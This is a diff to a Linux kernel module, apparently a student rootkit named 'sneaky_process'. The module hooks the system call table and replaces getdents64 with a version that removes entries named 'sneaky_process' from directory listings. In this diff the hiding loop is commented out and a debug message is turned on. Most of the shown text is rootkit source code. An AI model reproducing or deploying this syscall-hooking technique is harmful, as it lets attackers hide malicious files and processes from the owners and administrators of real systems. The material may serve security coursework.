@@ -8,20 +8,19 @@
 #include <linux/kallsyms.h>
 #include <asm/page.h>
 #include <asm/cacheflush.h>
-#include <linux/dirent.h>
+
 #define PREFIX "sneaky_process"
 
 //This is a pointer to the system call table
 static unsigned long *sys_call_table;
 
-// struct linux_dirent64 {
-//   uint64_t d_ino;    /* 64-bit inode number */
-//   uint64_t d_off;    /* 64-bit offset to next structure */
-//   unsigned short d_reclen; /* Size of this dirent */
-//   unsigned char d_type;   /* File type */
-//   char d_name[]; /* Filename (null-terminated) */
-// };
-
+struct linux_dirent64 {
+  uint64_t d_ino;    /* 64-bit inode number */
+  uint64_t d_off;    /* 64-bit offset to next structure */
+  unsigned short d_reclen; /* Size of this dirent */
+  unsigned char d_type;   /* File type */
+  char d_name[]; /* Filename (null-terminated) */
+};
 
 // Helper functions, turn on and off the PTE address protection mode
 // for syscall_table pointer
@@ -47,12 +46,13 @@ int disable_page_rw(void *ptr){
 
 asmlinkage int (*original_getdents64)(unsigned int fd, struct linux_dirent64 *dirptr,unsigned int count);
 
-asmlinkage int sneaky_sys_getdents64(unsigned int fd, struct linux_dirent64 *dirptr, unsigned int count)
+asmlinkage long sneaky_sys_getdents64(unsigned int fd, struct linux_dirent64 *dirptr, unsigned int count)
 {
-  //printk(KERN_INFO "Sneaky getdents is called.\n");
+  printk(KERN_INFO "Sneaky getdents is called.\n");
   int nread,bpos;
   struct linux_dirent64* d;
   nread = original_getdents64(fd,dirptr,count);
+  /*
   for(bpos=0;bpos<nread;){
     d = (struct linux_dirent64 *)((char *)dirptr + bpos);
     if (strcmp(d->d_name, "sneaky_process") == 0){
@@ -61,12 +61,12 @@ asmlinkage int sneaky_sys_getdents64(unsigned int fd, struct linux_dirent64 *dir
       void* source = (char*)d + current_size;
       memmove(d,source,rest);
       nread -= current_size;
-      break;
     }
     else{
       bpos += d->d_reclen;
     }
   }
+  */
   return nread;
 }
 
